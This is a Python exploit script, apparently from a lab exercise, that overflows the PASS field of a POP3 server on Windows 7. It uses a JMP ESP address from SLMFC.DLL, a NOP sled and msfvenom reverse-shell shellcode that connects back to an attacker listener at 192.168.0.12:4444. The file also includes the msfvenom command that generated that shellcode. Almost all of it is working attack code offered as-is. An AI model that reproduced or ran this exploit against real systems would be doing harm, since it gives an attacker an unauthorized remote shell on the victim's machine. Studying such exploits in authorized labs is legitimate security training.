#!/usr/bin/python
# tested on windows 7 x86 sp1
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Address=5F4A358F Message=0x5f4a358f: '\xff\xe4' |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\system32\SLMFC.DLL)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.12 LPORT=4444 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
# Payload size: 351 bytes

shellcode =  ""
shellcode += "\xbe\x79\xb1\x1f\x27\xda\xd6\xd9\x74\x24\xf4\x5f"
shellcode += "\x29\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\x0e"
shellcode += "\xbf\xfd\xd2\x0c\x57\x83\x1d\xec\xa8\xe4\x94\x09"
shellcode += "\x99\x24\xc2\x5a\x8a\x94\x80\x0e\x27\x5e\xc4\xba"
shellcode += "\xbc\x12\xc1\xcd\x75\x98\x37\xe0\x86\xb1\x04\x63"
shellcode += "\x05\xc8\x58\x43\x34\x03\xad\x82\x71\x7e\x5c\xd6"
shellcode += "\x2a\xf4\xf3\xc6\x5f\x40\xc8\x6d\x13\x44\x48\x92"
shellcode += "\xe4\x67\x79\x05\x7e\x3e\x59\xa4\x53\x4a\xd0\xbe"
shellcode += "\xb0\x77\xaa\x35\x02\x03\x2d\x9f\x5a\xec\x82\xde"
shellcode += "\x52\x1f\xda\x27\x54\xc0\xa9\x51\xa6\x7d\xaa\xa6"
shellcode += "\xd4\x59\x3f\x3c\x7e\x29\xe7\x98\x7e\xfe\x7e\x6b"
shellcode += "\x8c\x4b\xf4\x33\x91\x4a\xd9\x48\xad\xc7\xdc\x9e"
shellcode += "\x27\x93\xfa\x3a\x63\x47\x62\x1b\xc9\x26\x9b\x7b"
shellcode += "\xb2\x97\x39\xf0\x5f\xc3\x33\x5b\x08\x20\x7e\x63"
shellcode += "\xc8\x2e\x09\x10\xfa\xf1\xa1\xbe\xb6\x7a\x6c\x39"
shellcode += "\xb8\x50\xc8\xd5\x47\x5b\x29\xfc\x83\x0f\x79\x96"
shellcode += "\x22\x30\x12\x66\xca\xe5\xb5\x36\x64\x56\x76\xe6"
shellcode += "\xc4\x06\x1e\xec\xca\x79\x3e\x0f\x01\x12\xd5\xea"
shellcode += "\xc2\xdd\x82\xf4\x1d\xb6\xd0\xf4\x30\x1a\x5c\x12"
shellcode += "\x58\xb2\x08\x8d\xf5\x2b\x11\x45\x67\xb3\x8f\x20"
shellcode += "\xa7\x3f\x3c\xd5\x66\xc8\x49\xc5\x1f\x38\x04\xb7"
shellcode += "\xb6\x47\xb2\xdf\x55\xd5\x59\x1f\x13\xc6\xf5\x48"
shellcode += "\x74\x38\x0c\x1c\x68\x63\xa6\x02\x71\xf5\x81\x86"
shellcode += "\xae\xc6\x0c\x07\x22\x72\x2b\x17\xfa\x7b\x77\x43"
shellcode += "\x52\x2a\x21\x3d\x14\x84\x83\x97\xce\x7b\x4a\x7f"
shellcode += "\x96\xb7\x4d\xf9\x97\x9d\x3b\xe5\x26\x48\x7a\x1a"
shellcode += "\x86\x1c\x8a\x63\xfa\xbc\x75\xbe\xbe\xcd\x3f\xe2"
shellcode += "\x97\x45\xe6\x77\xaa\x0b\x19\xa2\xe9\x35\x9a\x46"
shellcode += "\x92\xc1\x82\x23\x97\x8e\x04\xd8\xe5\x9f\xe0\xde"
shellcode += "\x5a\x9f\x20"

payload = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try:
    print "\nSending tons of random bytes..."
    s.connect(('192.168.0.35', 110))
    data = s.recv(1024)
    s.send('USER legit' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + payload + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to POP3 for some reason..."